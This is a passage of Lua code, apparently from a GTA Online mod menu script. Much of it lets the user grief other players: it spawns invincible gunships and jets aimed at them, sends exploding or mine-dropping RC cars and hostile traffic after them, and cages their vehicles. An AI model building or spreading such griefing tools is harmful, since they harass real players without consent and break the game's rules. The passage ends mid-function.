        ENTITY.SET_ENTITY_INVINCIBLE(pilot, setGodmode)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)
        PED.SET_PED_KEEP_TASK(pilot, true)
        TASK.TASK_HELI_MISSION(pilot, heli, 0, target, 0.0, 0.0, 0.0, 23, 40.0, 40.0, -1.0, 0, 10, -1.0, 0)

        for seat = 1, 2 do
            local ped = entities.create_ped(29, pedHash, pos1, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(ped, heli, seat)
            WEAPON.GIVE_WEAPON_TO_PED(ped, gunnerWeapon, -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true)
            PED.SET_PED_MAX_HEALTH(ped, 500)
            ENTITY.SET_ENTITY_HEALTH(ped, 500, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(ped, setGodmode)
            PED.SET_PED_SHOOT_RATE(ped, 1000)
            PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, util.joaat("ARMY"))
            TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(ped, 200.0, 0)
        end
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
end
function spawn_lazer(targetId)
    local jetHash = util.joaat("lazer")
    local pedHash = util.joaat("s_m_y_blackops_01")
    request_model(jetHash)
    request_model(pedHash)
    local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = players.get_position(targetId)
    local jet = entities.create_vehicle(jetHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if ENTITY.DOES_ENTITY_EXIST(jet) then
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(jet), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(jet, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(jet), PLAYER.PLAYER_ID(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(jet, true, 1)
        set_decor_flag(jet, DecorFlag_isEnemyVehicle)
        local pos1 = get_random_offset_from_entity(jet, 30.0, 80.0)
        pos1.z = pos1.z + 500.0
        ENTITY.SET_ENTITY_COORDS(jet, pos1.x, pos1.y, pos1.z, false, false, false, false)
        set_entity_face_entity(jet, target, false)
        local blip = add_blip_for_entity(jet, 16, 4)
        set_blip_name(blip, "blip_4xz66m0", true) -- random collision for 0x2257C97F
        VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
        ENTITY.SET_ENTITY_INVINCIBLE(jet, setGodmode)
        VEHICLE.SET_VEHICLE_FORCE_AFTERBURNER(jet, true)

        local pilot = entities.create_ped(5, pedHash, pos1, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pilot, false, true)
        PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
        TASK.TASK_PLANE_MISSION(pilot, jet, 0, target, 0.0, 0.0, 0.0, 6, 100.0, 0.0, 0.0, 80.0, 50.0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 1, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, 60.0)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(jetHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end
function deleteVehiclePassengers(vehicle)
    for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) -1 do
        if not VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, seat, false) then
            local passenger = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
            delete_entity(passenger) 
        end
    end
end
function delete_enemy_veh()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isEnemyVehicle) and request_control(vehicle, 1000) then
            deleteVehiclePassengers(vehicle)
            delete_entity(vehicle)
        end
    end
end



----恶搞载具
local setInvincible = false
local evcount = 1
local AttackType <const> = {explode = 0, dropMine = 1}
local attacktype = 0
local selectedMine = 1
local mineSlider
function send_veh_attack_god(toggle)
    setInvincible = toggle 
end
function send_veh_attacker_number(value)
    evcount = value
end
local DecorFlag_isTrollyVehicle = 1 << 0
function dele_all_veh_attacker()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isTrollyVehicle) then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
            delete_entity(driver)
            delete_entity(vehicle)
        end
    end
end
function create_trolly_vehicle(targetId, vehicleHash, pedHash)
    if is_UltimateUser(targetId) then util.toast(BlockAttackUltimateUser) return end
    request_model(vehicleHash); request_model(pedHash)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
    local driver = 0
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), PLAYER.PLAYER_ID(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isTrollyVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    for i = 0, 50 do
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
    end
    local offset = get_random_offset_from_entity(vehicle, 25.0, 25.0)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE(offset.x, offset.y, offset.z, outCoords, 1, 3.0, 0.0) then
        driver = entities.create_ped(5, pedHash, pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, true, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), PLAYER.PLAYER_ID(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, true)
        set_entity_face_entity(vehicle, targetPed, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        VEHICLE.SET_VEHICLE_IS_CONSIDERED_BY_PLAYER(vehicle, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 500.0, 786988, 0.0, 0.0, true)
        PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(driver, 1)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    end
    return vehicle, driver
end
function send_veh_attack(opt, index, pid)
    local pedHash = util.joaat("mp_m_freemode_01")
		local i = 0
		repeat
			if opt == "Bandito" then
				local vehicleHash = util.joaat("rcbandito")
				local vehicle, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				add_blip_for_entity(vehicle, 646, 4)
				ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setInvincible)
				ENTITY.SET_ENTITY_VISIBLE(driver, false, false)

			elseif opt == "Go-Kart" then
				local vehicleHash = util.joaat("veto2")
				local gokart, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				ENTITY.SET_ENTITY_INVINCIBLE(gokart, setInvincible)
				VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
				VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
				ENTITY.SET_ENTITY_INVINCIBLE(driver, setInvincible)

				PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
				PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
				add_blip_for_entity(gokart, 748, 5)
			end
			i = i + 1
			util.yield(150)
		until i == evcount
    end
--武装劫匪
function GetMineHash()
    if selectedMine == 1 then
        return util.joaat("vehicle_weapon_mine_kinetic_rc")
    elseif selectedMine == 2 then
        return util.joaat("vehicle_weapon_mine_emp_rc")
    end
end
function send_veh_attacker(pid)
    local vehicleHash <const> = util.joaat("rcbandito")
    local pedHash <const> = util.joaat("mp_m_freemode_01")
    local lastShoot = newTimer()

    local bandito, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
    VEHICLE.SET_VEHICLE_MOD(bandito, 5, 3, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 48, 5, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 9, 0, false)
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(bandito, 128, 0, 128)
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(bandito, 128, 0, 128)
    ENTITY.SET_ENTITY_VISIBLE(driver, false, false)
    local blip = add_blip_for_entity(bandito, 646, 27)

    util.create_tick_handler(function()
        if not ENTITY.DOES_ENTITY_EXIST(bandito) or ENTITY.IS_ENTITY_DEAD(bandito, false) or not ENTITY.DOES_ENTITY_EXIST(driver) or ENTITY.IS_ENTITY_DEAD(driver, false) then
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false
        elseif NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) then
            local playerPos = players.get_position(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(bandito, true)

            if playerPos:distance(pos) > 3.0 or not request_control(bandito) or not request_control(driver) then
                return false
            end

            if attacktype == AttackType.explode then
                NETWORK.NETWORK_EXPLODE_VEHICLE(bandito, true, false, NETWORK.PARTICIPANT_ID_TO_INT())
                ENTITY.SET_ENTITY_HEALTH(driver, 0, 0)

            elseif attacktype == AttackType.dropMine and (not lastShoot.isEnabled() or lastShoot.elapsed() > 1000) and not MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, GetMineHash(), 3.0, true) then
                local weapon <const> = GetMineHash()

                if not WEAPON.HAS_WEAPON_ASSET_LOADED(weapon) then
                    WEAPON.REQUEST_WEAPON_ASSET(weapon, 31, 26)
                    return false
                end

                local min, max = v3.new(), v3.new()
                local modelHash = ENTITY.GET_ENTITY_MODEL(bandito)
                MISC.GET_MODEL_DIMENSIONS(modelHash, min, max)

                local coord0 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, 0.2)
                local coord1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, min.z)

                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(coord0.x, coord0.y, coord0.z, coord1.x, coord1.y, coord1.z, 0, true, weapon, PLAYER.PLAYER_ID(), true, false, -1.0, 0, false, false, 0, true, 1, 0, 0)
                lastShoot.reset()
            end
        elseif request_control(bandito) and request_control(driver) then
            TASK.CLEAR_PED_TASKS(driver)
            TASK.TASK_VEHICLE_DRIVE_WANDER(driver, bandito, 10.0, 786603)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
            remove_decor(bandito)
            util.remove_blip(blip)
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false
        end
    end)
end
function send_veh_attacker_weapon(index, value)
    if index == 1 then
        attacktype = AttackType.explode
    elseif index == 2 then
        attacktype = AttackType.dropMine
    end
end
function send_veh_attacker_weapon_mine(index, value)
    selectedMine = index
end


----GIF康娜
local photovalue = 1
logocoord = {x = 0.86,y = 0.57, fps = 100}
function GIF_kana(on)
    if on then
        showlogo = 1
        util.create_thread(function()
            while showlogo == 1 do
                local logo = directx.create_texture(filesystem.resources_dir() .. '/SakuraScript/GIF/kana/'..photovalue..'.png')
                directx.draw_texture(logo, 0.06, 0.1, 0.0, 0.0, logocoord.x, logocoord.y, 0, 1, 1, 1, 1)
                util.yield()
            end
        end)
        util.create_thread(function()
            while showlogo == 1 do
                if photovalue < 12 then
                    photovalue = photovalue + 1
                else
                    photovalue = 1
                end
                util.yield(logocoord.fps)
            end
        end)
    else
        showlogo = 0
    end
end
----小黄人
local photovalue1 = 1
logocoord1 = {x = 0.86,y = 0.57, fps = 150}
function GIF_xiaohuangren(on)
    if on then
        showlogo1 = 1
        util.create_thread(function()
            while showlogo1 == 1 do
                local logo = directx.create_texture(filesystem.resources_dir() .. '/SakuraScript/GIF/xiaohuangren/'..photovalue1..'.png')
                directx.draw_texture(logo, 0.06, 0.1, 0.0, 0.0, logocoord1.x, logocoord1.y, 0, 1, 1, 1, 1)
                util.yield()
            end
        end)
        util.create_thread(function()
            while showlogo1 == 1 do
                if photovalue1 < 22 then
                    photovalue1 = photovalue1 + 1
                else
                    photovalue1 = 1
                end
                util.yield(logocoord1.fps)
            end
        end)
    else
        showlogo1 = 0
    end
end


----黑人抬棺
function blacks_coffins()
    local ped = {}
    local pos = players.get_position(PLAYER.PLAYER_ID())
    pos.z = pos.z + 0.6

    local coffin = create_object(2193278353, pos.x, pos.y, pos.z)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(coffin, PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0.8, 0.0, 0, 0.0, true, true, false, true, 0, true, 0)

    ped[1] = create_ped(26,0x9B22DBAF, pos.x, pos.y, pos.z, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped[1],coffin, 0, 0.55,0,-0.6,0.0,0,0.0, true, true, false, true, 0, true, 0)
    ENTITY.FREEZE_ENTITY_POSITION(ped[1], true)
    ped[2] = create_ped(26,0x9B22DBAF, pos.x, pos.y, pos.z, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped[2],coffin, 0, -0.55,0,-0.6,0.0,0,0.0, true, true, false, true, 0, true, 0)
    ENTITY.FREEZE_ENTITY_POSITION(ped[2], true)
    ped[3] = create_ped(26,0x9B22DBAF, pos.x, pos.y, pos.z, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped[3],coffin, 0, 0.55,0.5,-0.6,0.0,0,0.0, true, true, false, true, 0, true, 0)
    ENTITY.FREEZE_ENTITY_POSITION(ped[3], true)
    ped[4] = create_ped(26,0x9B22DBAF, pos.x, pos.y, pos.z, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped[4],coffin, 0, -0.55,0.5,-0.6,0.0,0,0.0, true, true, false, true, 0, true, 0)
    ENTITY.FREEZE_ENTITY_POSITION(ped[4], true)
    ped[5] = create_ped(26,0x9B22DBAF, pos.x, pos.y, pos.z, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped[5],coffin, 0, 0.55,-0.5,-0.6,0.0,0,0.0, true, true, false, true, 0, true, 0)
    ENTITY.FREEZE_ENTITY_POSITION(ped[5], true)
    ped[6] = create_ped(26,0x9B22DBAF, pos.x, pos.y, pos.z, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped[6],coffin, 0, -0.55,-0.5,-0.6,0.0,0,0.0, true, true, false, true, 0, true, 0)
    ENTITY.FREEZE_ENTITY_POSITION(ped[6], true)
    for k, v in ipairs(ped) do
        calm_ped(v, true)
    end
end




----背藏武器
function Back_weapons(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	weaponback = on
	if weaponback then
		spawnweapon = 0
	end
	curweap = HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(PLAYER.PLAYER_PED_ID())
	if not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(PLAYER.PLAYER_PED_ID()) == -1569615261) and weaponback then
		spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0, 0, 0)
		attachweapon(spawnweapon)
	end
	while weaponback do
		if WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), 0) == 0 then
			if not (spawnweapon == 0) then
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)
			end
		else
			ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)
		end
		if not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(PLAYER.PLAYER_PED_ID()) == curweap) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(PLAYER.PLAYER_PED_ID()) == -1569615261) then
			if not (spawnweapon == 0) then
				delete_entity(spawnweapon)
			end
			curweap = HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(PLAYER.PLAYER_PED_ID())
			requestweapon(curweap)
			spawnweapon = WEAPON.CREATE_WEAPON_OBJECT(curweap, 1, pos.x, pos.y, pos.z, true, 1, 0, 0, 0)
			if (WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), 0) == 0) then
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, true, false)
			else
				ENTITY.SET_ENTITY_VISIBLE(spawnweapon, false, false)
			end
			attachweapon(spawnweapon)
		end
		util.yield()
	end
	delete_entity(spawnweapon)
end


----载具飞行模式
local vehfly = {speed = 100, coll = false, stop = true}
function veh_fly_speed(s)
    vehfly.speed = s
end
function veh_fly_coll(on)
    vehfly.coll = on
end
function veh_fly_stop(on)
    vehfly.stop = not on
end
function veh_fly(toggled)
    veh_fly_toggled = toggled
    while veh_fly_toggled do
        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) then
            display_buttons({{0, 32, '向前'},{1, 33, '向后'},{2, 22, '加速飞行'},{3, 35, '向右'},{4, 34, '向左'},{5, 21, '向上'},{6, 36, '向下'}})
            local curcar = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
            request_control(curcar)

            --无碰撞
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(curcar , not vehfly.coll, true)
            --冻结位置
            ENTITY.FREEZE_ENTITY_POSITION(curcar, vehfly.stop)
                
            local camr = CAM.GET_GAMEPLAY_CAM_ROT(0)
            ENTITY.SET_ENTITY_ROTATION(curcar, camr.x, camr.y, camr.z, 1, true)
            
            if PAD.IS_CONTROL_PRESSED(0, 32) then ----前w
                ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(curcar, vehfly.speed)
                if PAD.IS_CONTROL_PRESSED(0, 22) then ----加速space
                    ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(curcar, 2 * vehfly.speed)
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then ----后s
                ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(curcar, - vehfly.speed)
                if PAD.IS_CONTROL_PRESSED(0, 22) then
                    ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(curcar, - 2 * vehfly.speed)
                end
            end
            if PAD.IS_CONTROL_PRESSED(0, 21) then ----上shift
                ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, 0, 0, vehfly.speed, 0, true, true, true, true)
            elseif PAD.IS_CONTROL_PRESSED(0, 36) then ----下ctrl
                ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, 0, 0, - vehfly.speed, 0, true, true, true, true)
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then ----右d
                ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, vehfly.speed, 0, 0, 0, true, true, true, true)
            elseif PAD.IS_CONTROL_PRESSED(0, 34) then ----左a
                ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, - vehfly.speed, 0, 0, 0, true, true, true, true)
            end
        end
        util.yield()
    end
    local curcar = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID())
    ENTITY.FREEZE_ENTITY_POSITION(curcar, false)
    ENTITY.SET_ENTITY_HAS_GRAVITY(curcar, true)
    ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(curcar , true, true)
end




----放置墙壁
function fastNet(entity, pid)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
            for i = 1, 30 do
                if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                    util.yield(10)
                end    
            end
        end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    util.yield(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    util.yield(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    util.yield(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
    util.yield(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    util.yield(10)
    ENTITY1._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    util.yield(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    util.yield(10)
    ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
end
function Place_wall(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 4, 0)
    local pheading = ENTITY.GET_ENTITY_HEADING(ped)
    local hash = 309416120
    request_model(hash)
    local a1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z - 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(a1, pheading + 90)
    fastNet(a1, pid)
    local b1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z + 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(b1, pheading + 90)
    fastNet(b1, pid)
    util.yield(500)
    delete_entity(a1)
    delete_entity(b1)
end


----敌对交通
function GET_NEARBY_VEHICLES(pid, radius) 
	local vehicles = {}
	local p = PLAYER.GET_PLAYER_PED(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(p)
	local v = PED.GET_VEHICLE_PED_IS_IN(p, false)
	for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do 
		local veh_pos = ENTITY.GET_ENTITY_COORDS(vehicle)
		if vehicle ~= v and vector3.distance(pos, veh_pos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end
function REQUEST_CONTROL_LOOP(entity)
	local tick = 0
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 25 do
		util.yield()
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
	end
	if NETWORK.NETWORK_IS_SESSION_STARTED() then
		local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, true)
	end
end
function Hostile_traffic(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player_ped = PLAYER.GET_PLAYER_PED(pid)
    for k, vehicle in pairs(GET_NEARBY_VEHICLES(pid, 2000)) do	
        if not VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, -1) then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1)
            if not PED.IS_PED_A_PLAYER(driver) then 
                REQUEST_CONTROL_LOOP(driver)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                PED.SET_PED_MAX_HEALTH(driver, 300)
                ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
                ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
                VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
                VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle,-1, 3)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(driver)
                PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
                PED.SET_PED_COMBAT_ATTRIBUTES(driver, 46, true)
                TASK.TASK_COMBAT_PED(driver, player_ped, 0, 0)
                TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, player_ped, 6, 100, 0, 0, 0, true)
                util.yield(10)
            end
        end
    end
end


----变成恐龙
function give_car_addon(pid, hash, center, ang)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), true)
    local pos = ENTITY.GET_ENTITY_COORDS(car, true)
    pos.x = pos['x']
    pos.y = pos['y']
    pos.z = pos['z']
    request_model(hash)
    local ramp = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos['x'], pos['y'], pos['z'], true, false, false)
    local size = get_model_size(ENTITY.GET_ENTITY_MODEL(car))
    if center then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, 0.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true, 0)
    else
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, size['y']+1.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true, 0)
    end
end
function changemodel(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    give_car_addon(pid, util.joaat("h4_prop_h4_loch_monster"), true, -90.0)
end
----给载具套笼子
function longzi_veh(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    give_car_addon(pid, util.joaat("prop_gold_cont_01b"), true, -90.0)
end


----在车内生成NPC
function npcfillthecar(pid, index,value)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local target_ped = PLAYER.GET_PLAYER_PED(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(target_ped, true) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(target_ped, false)
        local success = true
        for i = 0, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(veh)) do
            if VEHICLE.IS_VEHICLE_SEAT_FREE(veh, i) then
                local c = ENTITY.GET_ENTITY_COORDS(veh)
                local ped = 0
                if index == 1 then
                    ped = PED.CREATE_RANDOM_PED(c.x, c.y, c.z)
                elseif index == 2 then
                    local cops = {'s_f_y_cop_01', 's_m_m_snowcop_0', 's_m_y_hwaycop_01', 'csb_cop', 's_m_y_cop_01'}
                    local pick = cops[math.random(1, #cops)]
                    request_model(util.joaat(pick))
                    ped = entities.create_ped(6, util.joaat(pick), c, 0)
                    PED.SET_PED_AS_COP(ped, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat("weapon_pistol"), 1000, false, false)
                elseif index == 3 then
                    local strippers = {'csb_stripper_01', 'csb_stripper_02', 's_f_y_stripper_01', 's_f_y_stripper_02', 's_f_y_stripperlite'}
                    local pick2 = strippers[math.random(1, #strippers)]
                    request_model(util.joaat(pick2))
                    ped = entities.create_ped(6, util.joaat(pick2), c, 0)
                elseif index == 4 then
                    request_model(util.joaat('ig_lestercrest'))
                    ped = entities.create_ped(6, util.joaat('ig_lestercrest'), c, 0)
                elseif index == 5 then
                    request_model(util.joaat('ig_lestercrest'))
                    ped = entities.create_ped(6, util.joaat('ig_lestercrest'), c, 0)
                end
                    
                PED.SET_PED_INTO_VEHICLE(ped, veh, i)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
                PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
                PED.SET_PED_CAN_BE_DRAGGED_OUT(ped, false)
